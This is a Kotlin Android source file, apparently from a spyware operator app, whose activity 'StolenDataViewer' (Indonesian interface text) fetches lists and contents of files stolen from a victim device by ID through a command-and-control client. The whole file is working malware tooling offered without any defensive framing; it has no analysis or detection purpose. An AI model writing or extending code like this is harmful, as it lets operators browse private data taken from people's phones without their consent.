package com.sadap.ortuapp.ui

import android.os.Bundle
import android.util.Log
import android.widget.ArrayAdapter
import android.widget.ListView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.sadap.ortuapp.R
import com.sadap.template.network.C2Client
import org.json.JSONObject
import kotlin.concurrent.thread

class StolenDataViewer : AppCompatActivity() {

    private lateinit var deviceId: String
    private lateinit var fileListView: ListView
    private lateinit var fileContentTextView: TextView
    private val stolenFiles = mutableListOf<String>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_stolen_data_viewer)

        deviceId = intent.getStringExtra("device_id") ?: ""
        if (deviceId.isEmpty()) {
            Toast.makeText(this, "Device ID tidak ditemukan.", Toast.LENGTH_SHORT).show()
            finish()
            return
        }

        fileListView = findViewById(R.id.fileListView)
        fileContentTextView = findViewById(R.id.fileContentTextView)

        title = "Data Curian dari $deviceId"
        fetchStolenFiles()

        fileListView.setOnItemClickListener { parent, view, position, id ->
            val filename = stolenFiles[position]
            fetchFileContent(filename)
        }
    }

    private fun fetchStolenFiles() {
        thread {
            val response = C2Client.get("/get_stolen_data_list", mapOf("device_id" to deviceId))
            runOnUiThread {
                if (response != null) {
                    try {
                        val json = JSONObject(response)
                        val filesArray = json.optJSONArray("files")
                        filesArray?.let {
                            stolenFiles.clear()
                            for (i in 0 until it.length()) {
                                stolenFiles.add(it.getString(i))
                            }
                            val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, stolenFiles)
                            fileListView.adapter = adapter
                        }
                    } catch (e: Exception) {
                        Log.e("StolenDataViewer", "JSON parsing error for stolen files list: ${e.message}")
                        Toast.makeText(this, "Gagal memuat daftar file curian.", Toast.LENGTH_LONG).show()
                    }
                } else {
                    Toast.makeText(this, "Gagal mengambil daftar file curian.", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    private fun fetchFileContent(filename: String) {
        thread {
            val response = C2Client.get("/get_stolen_data_content/$filename") // Path langsung ke filename
            runOnUiThread {
                if (response != null) {
                    try {
                        val json = JSONObject(response)
                        fileContentTextView.text = json.toString(2) // Pretty print JSON
                    } catch (e: Exception) {
                        Log.e("StolenDataViewer", "JSON parsing error for file content: ${e.message}")
                        Toast.makeText(this, "Gagal memuat konten file.", Toast.LENGTH_LONG).show()
                    }
                } else {
                    Toast.makeText(this, "Gagal mengambil konten file.", Toast.LENGTH_LONG).show()
                }
            }
        }
    }
}
